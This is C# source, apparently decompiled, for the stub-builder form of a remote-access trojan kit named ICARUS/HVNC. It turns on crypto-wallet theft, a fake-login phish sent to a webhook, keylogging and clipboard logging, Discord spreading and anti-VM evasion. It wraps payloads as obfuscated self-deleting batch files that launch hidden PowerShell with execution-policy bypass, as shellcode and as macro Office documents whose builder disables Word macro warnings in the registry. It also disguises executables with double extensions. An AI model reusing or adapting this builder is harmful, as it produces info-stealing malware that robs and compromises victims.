using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using Mono.Cecil;
using Mono.Cecil.Cil;
using ShitarusPrivate.HVNC.Properties;
using ShitarusPrivate.HVNC.StubUtils;
using ShitarusPrivate.HVNC.StubUtils.Donut;
using ShitarusPrivate.Icarus;
using ShitarusPrivate.Microsoft.Office.Interop.Word;
using ShitarusPrivate.RJCodeAdvance.RJControls;
using ShitarusPrivate.Zeroit.Framework.UIThemes.Ambience;
using Toolbelt.Drawing;

namespace ShitarusPrivate.HVNC
{
    public class StubBuilder : Form
    {
        public class FileGen
        {
            public static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, bool selfdelete, Random rng)
            {
                string input = StubGen.CreatePS(key, iv, mode, rng);
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.AppendLine("@echo off");
                (string, string) tuple = Obfuscator.GenCodeBat("copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", rng, 4);
                stringBuilder.AppendLine(tuple.Item1);
                stringBuilder.AppendLine(tuple.Item2 + " \"%~dp0%~nx0.exe\" /y");
                stringBuilder.AppendLine("cls");
                tuple = Obfuscator.GenCodeBat("cd %~dp0", rng, 4);
                stringBuilder.AppendLine(tuple.Item1);
                stringBuilder.AppendLine(tuple.Item2);
                string input2 = "-noprofile " + (hidden ? "-windowstyle hidden" : string.Empty) + " -executionpolicy bypass -command ";
                tuple = Obfuscator.GenCodeBat(input2, rng, 2);
                stringBuilder.AppendLine(tuple.Item1);
                (string, string) tuple2 = Obfuscator.GenCodeBat(input, rng, 2);
                stringBuilder.AppendLine(tuple2.Item1);
                stringBuilder.AppendLine("\"%~nx0.exe\" " + tuple.Item2 + tuple2.Item2);
                if (selfdelete)
                {
                    stringBuilder.AppendLine("(goto) 2>nul & del \"%~f0\"");
                }
                stringBuilder.AppendLine("exit /b");
                return stringBuilder.ToString();
            }
        }

        [Serializable]
        [CompilerGenerated]
        private sealed class __c
        {
            public static readonly __c __9 = new __c();

            public static Func<string, char> __9__19_0;

            public static Func<string, char> __9__20_0;

            internal char _RandomMutex_b__19_0(string s)
            {
                return s[random.Next(s.Length)];
            }

            internal char _RandomNumber_b__20_0(string s)
            {
                return s[random.Next(s.Length)];
            }
        }

        [CompilerGenerated]
        private sealed class __c__DisplayClass10_0
        {
            public string exepath;

            internal void _Build_b__1()
            {
                Confuser(exepath, exepath);
            }

            internal void _Build_b__2()
            {
                convert(exepath, exepath.Replace(".exe", ".vbs"));
            }
        }

        public static byte[] b;

        public static string filename;

        public static Process procM = new Process();

        public static Random r = new Random();

        public static string donutartifactLocation;

        public static Random random = new Random();

        public string netversion;

        private IContainer components;

        private Label label5;

        private PrimeTheme primeTheme1;

        private StudioButton studioButton5;

        private StudioButton studioButton4;

        private StudioButton button2;

        private StudioButton button3;

        private RJComboBox comboBox1;

        private Label label2;

        private Label label1;

        private PictureBox pictureBox1;

        private Label label3;

        private PrimeButton button1;

        private JCS.ToggleSwitch chkWDEX;

        private JCS.ToggleSwitch chkStartup;

        private JCS.ToggleSwitch chkBin;

        private JCS.ToggleSwitch chkWatcher;

        private Label label4;

        private Label label6;

        private PrimeButton primeButton2;

        private PrimeButton primeButton1;

        private TextBox txtFolder;

        private TextBox txtMutex;

        private TextBox txtPORT;

        private TextBox txtIdentifier;

        private TextBox txtIP;

        private PictureBox pictureBoxicon;

        private TextBox txtIcon;

        private PrimeButton primeButton3;

        private JCS.ToggleSwitch toggleButtonicon;

        private Label label7;

        private JCS.ToggleSwitch chkNet4;

        private Label label8;

        private JCS.ToggleSwitch chkNet2;

        private Label label9;

        private Label label11;

        private JCS.ToggleSwitch chkUCA;

        private Label label10;

        private JCS.ToggleSwitch chkBatch;

        private StudioButton refreshKeys;

        private TextBox iv6;

        private TextBox iv1;

        private TextBox key2;

        private TextBox key1;

        private CheckBox xorEncryption;

        private CheckBox aesEncryption;

        private PictureBox pictureBox2;

        private Label label15;

        private JCS.ToggleSwitch antiVM;

        private JCS.ToggleSwitch antiDebug;

        private Label label13;

        private JCS.ToggleSwitch selfDelete;

        private Label label12;

        private JCS.ToggleSwitch hidden;

        private Label label14;

        private Label label16;

        private JCS.ToggleSwitch chkObf;

        private ToolTip toolTip1;

        private Label label18;

        private JCS.ToggleSwitch chkCrypter;

        internal TextBox txtFilename;

        internal ListBox listBox2;

        private LinkLabel linkLabel1;

        private JCS.ToggleSwitch chkFakeLogin;

        private Label label19;

        private JCS.ToggleSwitch chkMacro;

        private Label label20;

        private TextBox txtWebHook;

        private TextBox txtTGTOKEN;

        private TextBox txtTGID;

        private GroupBox groupBox1;

        private GroupBox groupBox2;

        private CheckBox chkExcel;

        private CheckBox chkDoc;

        private Label label21;

        private JCS.ToggleSwitch chkASDoc;

        private Label label25;

        private JCS.ToggleSwitch chkVBS;

        private Label label26;

        private JCS.ToggleSwitch chkAdvanceBotK;

        private Label label28;

        private JCS.ToggleSwitch chkBotK;

        private Label label27;

        private JCS.ToggleSwitch chkTargetWallets;

        private Label label17;

        private AmbianceTabControl ambianceTabControl1;

        private TabPage tabPage1;

        private AmbianceSeparator ambianceSeparator2;

        private Label label29;

        private AmbianceSeparator ambianceSeparator1;

        private TabPage tabPage2;

        private TabPage tabPage3;

        private TabPage tabPage4;

        private TabPage tabPage5;

        private Label label30;

        private PictureBox pictureBox5;

        private PictureBox pictureBox4;

        private PictureBox pictureBox3;

        private Label label31;

        private Label label32;

        private JCS.ToggleSwitch chkSpread;

        private Label label35;

        private TextBox txtDiscMessage;

        private TextBox txtDiscordFilename;

        private Label label33;

        private Label label34;

        private PrimeButton primeButton4;

        private TextBox txtDiscFilePath;

        private GroupBox groupBox3;

        private JCS.ToggleSwitch chkExecS;

        private Label label36;

        private TabPage tabPage6;

        private TextBox txtIconPath;

        private TextBox txtUrl;

        private PrimeButton btnBrowseIcon;

        private StudioButton studioButton1;

        private PictureBox iconPreview;

        private Label label37;

        private JCS.ToggleSwitch chkSpoof;

        private ComboBox rjComboBox1;

        private TextBox txtSdesc;

        private TextBox txtSname;

        private TextBox txtPHPLINK;

        private TextBox txtFTPPASS;

        private TextBox txtFTPUSER;

        private TextBox txtFTPHOST;

        private StudioButton studioButton2;

        private Label label22;

        private JCS.ToggleSwitch chkKlogger;

        private Label label23;

        private JCS.ToggleSwitch chkClogger;

        private Label label24;

        private JCS.ToggleSwitch toggleSwitch1;

        private PrimeButton btnBinderBrowse;

        private Label label38;

        private ListBox listBox1;

        private PrimeButton btnBinderDelete;

        public StubBuilder(string port)
        {
            InitializeComponent();
            txtPORT.Text = port;
            ReadSettings();
        }

        public bool ReadSettings()
        {
            try
            {
                string path = Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath) + "\\ICARUS 2.0.0.3.conf";
                List<string> list = File.ReadLines(path).ToList();
                string text = list[5].Replace("host=", null);
                txtIP.Text = text;
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Build();
        }

        public static void CreateWordDoc(string donutartifactLocation, string vba, string output)
        {
            FileStream fileStream = new FileStream(donutartifactLocation, FileMode.Open);
            BinaryReader binaryReader = new BinaryReader(fileStream);
            byte[] inArray = binaryReader.ReadBytes(Convert.ToInt32(fileStream.Length));
            string alternativeText = Convert.ToBase64String(inArray);
            global::ShitarusPrivate.Microsoft.Office.Interop.Word.Application obj = (global::ShitarusPrivate.Microsoft.Office.Interop.Word.Application)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("000209FF-0000-0000-C000-000000000046")));
            obj.Visible = false;
            obj.DisplayAlerts = WdAlertLevel.wdAlertsNone;
            global::ShitarusPrivate.Microsoft.Office.Interop.Word.Application application = obj;
            string version = application.Version;
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE", writable: true).CreateSubKey("Microsoft\\Office\\" + version + "\\Word\\Security");
            registryKey.SetValue("AccessVBOM", 1, RegistryValueKind.DWord);
            registryKey.Close();
            RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE", writable: true).CreateSubKey("Microsoft\\Office\\" + version + "\\Word\\Security");
            registryKey2.SetValue("VBAWarnings", 1, RegistryValueKind.DWord);
            registryKey2.Close();
            object Template = Missing.Value;
            global::ShitarusPrivate.Microsoft.Office.Interop.Word.Document document = application.Documents.Add(ref Template, ref Template, ref Template, ref Template);
            string fileName = "https://www.publicdomainpictures.net/pictures/30000/t2/plain-white-background.jpg";
            InlineShapes inlineShapes = application.ActiveDocument.InlineShapes;
            object LinkToFile = false;
            object SaveWithDocument = true;
            object Range = Type.Missing;
            inlineShapes.AddPicture(fileName, ref LinkToFile, ref SaveWithDocument, ref Range).AlternativeText = alternativeText;
            Directory.GetCurrentDirectory();
            File.ReadAllText(vba);
            object FileName = output;
            global::ShitarusPrivate.Microsoft.Office.Interop.Word.Document document2 = document;
            Range = 0;
            SaveWithDocument = Type.Missing;
            LinkToFile = Type.Missing;
            object AddToRecentFiles = Type.Missing;
            object WritePassword = Type.Missing;
            object ReadOnlyRecommended = Type.Missing;
            object EmbedTrueTypeFonts = Type.Missing;
            object SaveNativePictureFormat = Type.Missing;
            object SaveFormsData = Type.Missing;
            object SaveAsAOCELetter = Type.Missing;
            object Encoding = Type.Missing;
            object InsertLineBreaks = Type.Missing;
            object AllowSubstitutions = Type.Missing;
            object LineEnding = Type.Missing;
            object AddBiDiMarks = Type.Missing;
            document2.SaveAs(ref FileName, ref Range, ref SaveWithDocument, ref LinkToFile, ref AddToRecentFiles, ref WritePassword, ref ReadOnlyRecommended, ref EmbedTrueTypeFonts, ref SaveNativePictureFormat, ref SaveFormsData, ref SaveAsAOCELetter, ref Encoding, ref InsertLineBreaks, ref AllowSubstitutions, ref LineEnding, ref AddBiDiMarks);
            document.Close(ref Template, ref Template, ref Template);
            document = null;
            application.Quit(ref Template, ref Template, ref Template);
            application = null;
        }

        public async void Build()
        {
            if (chkFakeLogin.Checked)
            {
                if (!string.IsNullOrWhiteSpace(HVNC.Properties.Settings.Default.HOOK))
                {
                    txtWebHook.Text = HVNC.Properties.Settings.Default.HOOK;
                }
                else
                {
                    HVNC.Properties.Settings.Default.HOOK = txtWebHook.Text;
                    HVNC.Properties.Settings.Default.Save();
                }
            }
            if (string.IsNullOrWhiteSpace(txtTGID.Text) && string.IsNullOrWhiteSpace(txtTGTOKEN.Text))
            {
                HVNC.Properties.Settings.Default.TGID = txtTGID.Text;
                HVNC.Properties.Settings.Default.TGTOKEN = txtTGTOKEN.Text;
                HVNC.Properties.Settings.Default.Save();
            }
            else
            {
                txtTGID.Text = HVNC.Properties.Settings.Default.TGID;
                txtTGTOKEN.Text = HVNC.Properties.Settings.Default.TGTOKEN;
                HVNC.Properties.Settings.Default.Save();
            }
            if (string.IsNullOrWhiteSpace(txtIP.Text) || string.IsNullOrWhiteSpace(txtPORT.Text))
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint iPEndPoint = socket.LocalEndPoint as IPEndPoint;
                    string text = iPEndPoint.Address.ToString();
                    txtIP.Text = string.Empty;
                    txtIP.Text = text;
                }
                txtPORT.Text = HVNC.Properties.Settings.Default.PORT;
                txtMutex.Text = RandomMutex(9);
                txtIdentifier.Text = "Icarus_Client";
                txtFolder.Text = RandomMutex(9);
                txtFilename.Text = RandomMutex(9) + ".exe";
            }
            try
            {
                if (!string.IsNullOrWhiteSpace(txtIP.Text) && !string.IsNullOrWhiteSpace(txtPORT.Text))
                {
                    if (txtIcon.Text == "ICON")
                    {
                        MessageBox.Show("Icon is required in order to build.", "ICARUS", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                        return;
                    }
                    __c__DisplayClass10_0 _c__DisplayClass10_ = new __c__DisplayClass10_0();
                    _c__DisplayClass10_.exepath = Path.Combine(System.Windows.Forms.Application.StartupPath, txtFilename.Text);
                    button1.Enabled = false;
                    listBox2.Items.Add("Don't close,wait until popup...");
                    listBox2.Items.Add("Sending Request to Server!");
                    listBox2.Items.Add("Waiting for Encryption...");
                    Task.Run((Func<Task>)_Build_b__10_0).Wait();
                    if (chkTargetWallets.Checked)
                    {
                        listBox2.Items.Add("Targeting Crypto Wallets Enabled...");
                        AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly(_c__DisplayClass10_.exepath);
                        foreach (TypeDefinition type in assemblyDefinition.MainModule.Types)
                        {
                            if (!type.ToString().Contains("Stub.Program"))
                            {
                                continue;
                            }
                            foreach (MethodDefinition method in type.Methods)
                            {
                                if (!method.ToString().Contains("Main"))
                                {
                                    continue;
                                }
                                foreach (Instruction instruction in method.Body.Instructions)
                                {
                                    if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "%TT%")
                                    {
                                        instruction.Operand = "True";
                                    }
                                }
                            }
                        }
                        string exepath = _c__DisplayClass10_.exepath;
                        assemblyDefinition.Write(exepath.Replace(".exe", "Web.exe"));
                        assemblyDefinition.Dispose();
                        File.Delete(_c__DisplayClass10_.exepath);
                        File.Move(exepath.Replace(".exe", "Web.exe"), _c__DisplayClass10_.exepath);
                    }
                    if (chkFakeLogin.Checked)
                    {
                        AssemblyDefinition assemblyDefinition2 = AssemblyDefinition.ReadAssembly(_c__DisplayClass10_.exepath);
                        foreach (TypeDefinition type2 in assemblyDefinition2.MainModule.Types)
                        {
                            if (!type2.ToString().Contains("Stub.Program"))
                            {
                                continue;
                            }
                            foreach (MethodDefinition method2 in type2.Methods)
                            {
                                if (!method2.ToString().Contains("Main"))
                                {
                                    continue;
                                }
                                foreach (Instruction instruction2 in method2.Body.Instructions)
                                {
                                    if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "%LOGF%")
                                    {
                                        instruction2.Operand = "Yes";
                                    }
                                    if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "%HOOK%")
                                    {
                                        instruction2.Operand = txtWebHook.Text;
                                    }
                                }
                            }
                        }
                        string exepath2 = _c__DisplayClass10_.exepath;
                        assemblyDefinition2.Write(exepath2.Replace(".exe", "Web.exe"));
                        assemblyDefinition2.Dispose();
                        File.Delete(_c__DisplayClass10_.exepath);
                        File.Move(exepath2.Replace(".exe", "Web.exe"), _c__DisplayClass10_.exepath);
                    }
                    if (chkKlogger.Checked)
                    {
                        AssemblyDefinition assemblyDefinition3 = AssemblyDefinition.ReadAssembly(_c__DisplayClass10_.exepath);
                        foreach (TypeDefinition type3 in assemblyDefinition3.MainModule.Types)
                        {
                            if (!type3.ToString().Contains("Stub.Program"))
                            {
                                continue;
                            }
                            foreach (MethodDefinition method3 in type3.Methods)
                            {
                                if (!method3.ToString().Contains("Main"))
                                {
                                    continue;
                                }
                                foreach (Instruction instruction3 in method3.Body.Instructions)
                                {
                                    if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "%KELOGS%")
                                    {
                                        instruction3.Operand = "True";
                                    }
                                    if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "%CBOARD%")
                                    {
                                        instruction3.Operand = "True";
                                    }
                                }
                            }
                        }
                        string exepath3 = _c__DisplayClass10_.exepath;
                        assemblyDefinition3.Write(exepath3.Replace(".exe", "Web.exe"));
                        assemblyDefinition3.Dispose();
                        File.Delete(_c__DisplayClass10_.exepath);
                        File.Move(exepath3.Replace(".exe", "Web.exe"), _c__DisplayClass10_.exepath);
                    }
                    if (chkBotK.Checked)
                    {
                        AssemblyDefinition assemblyDefinition4 = AssemblyDefinition.ReadAssembly(_c__DisplayClass10_.exepath);
                        foreach (TypeDefinition type4 in assemblyDefinition4.MainModule.Types)
                        {
                            if (!type4.ToString().Contains("Stub.Program"))
                            {
                                continue;
                            }
                            foreach (MethodDefinition method4 in type4.Methods)
                            {
                                if (!method4.ToString().Contains("Main"))
                                {
                                    continue;
                                }
                                foreach (Instruction instruction4 in method4.Body.Instructions)
                                {
                                    if (instruction4.OpCode.ToString() == "ldstr" && instruction4.Operand.ToString() == "%LAGKILLER%")
                                    {
                                        instruction4.Operand = "True";
                                    }
                                }
                            }
                        }
                        string exepath4 = _c__DisplayClass10_.exepath;
                        assemblyDefinition4.Write(exepath4.Replace(".exe", "Web.exe"));
                        assemblyDefinition4.Dispose();
                        File.Delete(_c__DisplayClass10_.exepath);
                        File.Move(exepath4.Replace(".exe", "Web.exe"), _c__DisplayClass10_.exepath);
                    }
                    if (chkAdvanceBotK.Checked)
                    {
                        AssemblyDefinition assemblyDefinition5 = AssemblyDefinition.ReadAssembly(_c__DisplayClass10_.exepath);
                        foreach (TypeDefinition type5 in assemblyDefinition5.MainModule.Types)
                        {
                            if (!type5.ToString().Contains("Stub.Program"))
                            {
                                continue;
                            }
                            foreach (MethodDefinition method5 in type5.Methods)
                            {
                                if (!method5.ToString().Contains("Main"))
                                {
                                    continue;
                                }
                                foreach (Instruction instruction5 in method5.Body.Instructions)
                                {
                                    if (instruction5.OpCode.ToString() == "ldstr" && instruction5.Operand.ToString() == "%LAGAKILLER%")
                                    {
                                        instruction5.Operand = "True";
                                    }
                                }
                            }
                        }
                        string exepath5 = _c__DisplayClass10_.exepath;
                        assemblyDefinition5.Write(exepath5.Replace(".exe", "Web.exe"));
                        assemblyDefinition5.Dispose();
                        File.Delete(_c__DisplayClass10_.exepath);
                        File.Move(exepath5.Replace(".exe", "Web.exe"), _c__DisplayClass10_.exepath);
                    }
                    if (chkBin.Checked)
                    {
                        listBox2.Items.Add("Selected .bin option...");
                        listBox2.Items.Add("Exporting bin...");
                        Donut.Generate(_c__DisplayClass10_.exepath, _c__DisplayClass10_.exepath.Replace(".exe", ".bin"));
                    }
                    if (chkBatch.Checked)
                    {
                        listBox2.Items.Add("Selected Batch output...");
                        while (!File.Exists(_c__DisplayClass10_.exepath))
                        {
                            Thread.Sleep(2000);
                        }
                        Crypt(_c__DisplayClass10_.exepath);
                    }
                    if (chkMacro.Checked)
                    {
                        chkBin.Checked = true;
                        while (!File.Exists(_c__DisplayClass10_.exepath.Replace(".exe", ".bin")))
                        {
                            Thread.Sleep(2000);
                        }
                        listBox2.Items.Add("Generating VBA macro...");
                        if (chkDoc.Checked)
                        {
                            if (chkObf.Checked)
                            {
                                IcarusW.Create(_c__DisplayClass10_.exepath.Replace(".exe", ".bin"), _c__DisplayClass10_.exepath.Replace(".exe", ".vba"), 5, "doc", "yes");
                            }
                            else
                            {
                                IcarusW.Create(_c__DisplayClass10_.exepath.Replace(".exe", ".bin"), _c__DisplayClass10_.exepath.Replace(".exe", ".vba"), 5, "doc", "no");
                            }
                        }
                        else if (chkExcel.Checked)
                        {
                            if (chkObf.Checked)
                            {
                                IcarusW.Create(_c__DisplayClass10_.exepath.Replace(".exe", ".bin"), _c__DisplayClass10_.exepath.Replace(".exe", ".vba"), 5, "excel", "yes");
                            }
                            else
                            {
                                IcarusW.Create(_c__DisplayClass10_.exepath.Replace(".exe", ".bin"), _c__DisplayClass10_.exepath.Replace(".exe", ".vba"), 5, "excel", "no");
                            }
                        }
                        listBox2.Items.Add("Encrypting macro...");
                    }
                    if (chkASDoc.Checked)
                    {
                        string text2 = Path.Combine(System.Windows.Forms.Application.StartupPath, "payload.bin");
                        Path.Combine(System.Windows.Forms.Application.StartupPath, "Loader.cs");
                        while (!File.Exists(_c__DisplayClass10_.exepath.Replace(".exe", ".vba")))
                        {
                            Thread.Sleep(2000);
                        }
                        Donut.Generate(_c__DisplayClass10_.exepath, text2);
                        while (!File.Exists(text2))
                        {
                            Thread.Sleep(2000);
                        }
                        string text3 = "explorer.exe".Replace(".exe", "");
                        FileStream fileStream = new FileStream(text2, FileMode.Open);
                        BinaryReader binaryReader = new BinaryReader(fileStream);
                        byte[] inArray = binaryReader.ReadBytes(Convert.ToInt32(fileStream.Length));
                        string text4 = Convert.ToBase64String(inArray);
                        string currentDirectory = Directory.GetCurrentDirectory();
                        string text5 = Path.Combine(currentDirectory, "Loader.cs");
                        string text6 = File.ReadAllText(text5);
                        text6 = text6.Replace("REPLACE1", text3);
                        File.WriteAllText(text5, text6);
                        text6 = text6.Replace("REPLACE2", text4);
                        File.WriteAllText(text5, text6);
                        string fileName = "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v2.0.50727\\\\csc.exe";
                        string text7 = Path.Combine(currentDirectory, "LittleCorporal_Loader.exe");
                        string arguments = "/out:" + text7 + " " + text5;
                        Process process = new Process();
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.CreateNoWindow = true;
                        process.StartInfo.FileName = fileName;
                        process.StartInfo.Arguments = arguments;
                        process.Start();
                        process.WaitForExit();
                        text6 = text6.Replace(text3, "REPLACE1");
                        File.WriteAllText(text5, text6);
                        text6 = text6.Replace(text4, "REPLACE2");
                        File.WriteAllText(text5, text6);
                        CreateWordDoc(text2, _c__DisplayClass10_.exepath.Replace(".exe", ".vba"), _c__DisplayClass10_.exepath.Replace(".exe", ".doc"));
                        File.Delete(_c__DisplayClass10_.exepath);
                        File.Delete(Path.Combine(System.Windows.Forms.Application.StartupPath, "LittleCorporal.Loader.exe"));
                        File.Delete(Path.Combine(System.Windows.Forms.Application.StartupPath, "payload.bin"));
                    }
                    if (chkSpread.Checked)
                    {
                        AssemblyDefinition assemblyDefinition6 = AssemblyDefinition.ReadAssembly(_c__DisplayClass10_.exepath);
                        foreach (TypeDefinition type6 in assemblyDefinition6.MainModule.Types)
                        {
                            if (!type6.ToString().Contains("Stub.Program"))
                            {
                                continue;
                            }
                            foreach (MethodDefinition method6 in type6.Methods)
                            {
                                if (!method6.ToString().Contains("Main"))
                                {
                                    continue;
                                }
                                foreach (Instruction instruction6 in method6.Body.Instructions)
                                {
                                    if (instruction6.OpCode.ToString() == "ldstr" && instruction6.Operand.ToString() == "%SPREADACT%")
                                    {
                                        instruction6.Operand = "True";
                                    }
                                    if (instruction6.OpCode.ToString() == "ldstr" && instruction6.Operand.ToString() == "%SMESSAGE%")
                                    {
                                        instruction6.Operand = txtDiscMessage.Text;
                                    }
                                    if (instruction6.OpCode.ToString() == "ldstr" && instruction6.Operand.ToString() == "%SFNAME%")
                                    {
                                        instruction6.Operand = txtDiscordFilename.Text;
                                    }
                                    if (instruction6.OpCode.ToString() == "ldstr" && instruction6.Operand.ToString() == "%YESNOS%")
                                    {
                                        instruction6.Operand = "True";
                                    }
                                }
                            }
                        }
                        string exepath6 = _c__DisplayClass10_.exepath;
                        assemblyDefinition6.Write(exepath6.Replace(".exe", "Web.exe"));
                        assemblyDefinition6.Dispose();
                        File.Delete(_c__DisplayClass10_.exepath);
                        File.Move(exepath6.Replace(".exe", "Web.exe"), _c__DisplayClass10_.exepath);
                    }
                    listBox2.Items.Add("Finalizing Stub...");
                    while (!File.Exists(_c__DisplayClass10_.exepath))
                    {
                        Thread.Sleep(2000);
                    }
                    await Task.Run((Action)_c__DisplayClass10_._Build_b__1);
                    button1.Enabled = true;
                    if (chkCrypter.Checked)
                    {
                        File.Delete(_c__DisplayClass10_.exepath);
                        string directoryName = Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                        MessageBox.Show("Payload Encrypted Successfully !Saved: " + directoryName, "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    }
                    else if (chkBatch.Checked)
                    {
                        File.Delete(_c__DisplayClass10_.exepath);
                        string directoryName2 = Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                        MessageBox.Show("Batch Payload Encrypted Successfully !Saved: " + directoryName2, "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    }
                    else if (chkBin.Checked)
                    {
                        if (chkMacro.Checked)
                        {
                            File.Delete(_c__DisplayClass10_.exepath.Replace(".exe", ".bin"));
                            Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                            MessageBox.Show("Macro Payload generated Successfully !Saved: " + _c__DisplayClass10_.exepath.Replace(".exe", ".vba"), "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        }
                        else
                        {
                            File.Delete(_c__DisplayClass10_.exepath);
                            string directoryName3 = Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                            MessageBox.Show("Shellcode Payload Encrypted Successfully !Saved: " + directoryName3, "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        }
                    }
                    else if (chkVBS.Checked)
                    {
                        await Task.Run((Action)_c__DisplayClass10_._Build_b__2);
                        string path = Path.Combine(Path.GetTempPath(), "convert.exe");
                        File.Delete(path);
                        File.Delete(_c__DisplayClass10_.exepath);
                        Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                        MessageBox.Show("VBS Payload generated Successfully !Saved: " + _c__DisplayClass10_.exepath.Replace(".exe", ".vbs"), "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    }
                    else if (chkSpoof.Checked)
                    {
                        string itemText = rjComboBox1.GetItemText(rjComboBox1.SelectedItem);
                        if (itemText.Contains(".jpg"))
                        {
                            File.Move(_c__DisplayClass10_.exepath, _c__DisplayClass10_.exepath.Replace(".exe", ".jpg.exe"));
                            File.Delete(_c__DisplayClass10_.exepath);
                            Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                            MessageBox.Show("Extention spoofed Successfully !Saved: " + _c__DisplayClass10_.exepath.Replace(".exe", ".jpg"), "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        }
                        else if (itemText.Contains(".png"))
                        {
                            File.Move(_c__DisplayClass10_.exepath, _c__DisplayClass10_.exepath.Replace(".exe", ".png.exe"));
                            File.Delete(_c__DisplayClass10_.exepath);
                            Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                            MessageBox.Show("Extention spoofed Successfully !Saved: " + _c__DisplayClass10_.exepath.Replace(".exe", ".png"), "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        }
                        else if (itemText.Contains(".mp3"))
                        {
                            File.Move(_c__DisplayClass10_.exepath, _c__DisplayClass10_.exepath.Replace(".exe", ".mp3.exe"));
                            File.Delete(_c__DisplayClass10_.exepath);
                            Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                            MessageBox.Show("Extention spoofed Successfully !Saved: " + _c__DisplayClass10_.exepath.Replace(".exe", ".mp3"), "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        }
                        else if (itemText.Contains(".mp4"))
                        {
                            File.Move(_c__DisplayClass10_.exepath, _c__DisplayClass10_.exepath.Replace(".exe", ".mp4.exe"));
                            File.Delete(_c__DisplayClass10_.exepath);
                            Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                            MessageBox.Show("Extention spoofed Successfully !Saved: " + _c__DisplayClass10_.exepath.Replace(".exe", ".mp4"), "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        }
                        else if (itemText.Contains(".txt"))
                        {
                            File.Move(_c__DisplayClass10_.exepath, _c__DisplayClass10_.exepath.Replace(".exe", ".txt.exe"));
                            File.Delete(_c__DisplayClass10_.exepath);
                            Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                            MessageBox.Show("Extention spoofed Successfully !Saved: " + _c__DisplayClass10_.exepath.Replace(".exe", ".txt"), "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        }
                        else if (itemText.Contains(".pptx"))
                        {
                            File.Move(_c__DisplayClass10_.exepath, _c__DisplayClass10_.exepath.Replace(".exe", ".pptx.exe"));
                            File.Delete(_c__DisplayClass10_.exepath);
                            Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                            MessageBox.Show("Extention spoofed Successfully !Saved: " + _c__DisplayClass10_.exepath.Replace(".exe", ".pptx"), "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        }
                        else if (itemText.Contains(".cmd"))
                        {
                            File.Move(_c__DisplayClass10_.exepath, _c__DisplayClass10_.exepath.Replace(".exe", ".cmd.exe"));
                            File.Delete(_c__DisplayClass10_.exepath);
                            Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
                            MessageBox.Show("Extention spoofed Successfully !Saved: " + _c__DisplayClass10_.exepath.Replace(".exe", ".cmd"), "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        }
                    }
                    else
                    {
                        if (toggleButtonicon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                        {
                            txtIcon.Enabled = true;
                            pictureBoxicon.Enabled = true;
                            IconInjector.InjectIcon(_c__DisplayClass10_.exepath, txtIcon.Text);
                        }
                        MessageBox.Show("Successfully ! File saved to : " + _c__DisplayClass10_.exepath, "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    }
                    SaveSettings();
                    Close();
                }
                else
                {
                    MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
            }
            catch
            {
            }
        }

        public static void convert(string infile, string outfile)
        {
            while (!File.Exists(infile))
            {
                Thread.Sleep(2000);
            }
            string text = Path.Combine(Path.GetTempPath(), "convert.exe");
            File.WriteAllBytes(text, Resources.file2vbscript);
            Interaction.Shell("\"" + text + "\" \"" + infile + "\"  \"" + outfile + "\"", AppWinStyle.Hide, Wait: true);
        }

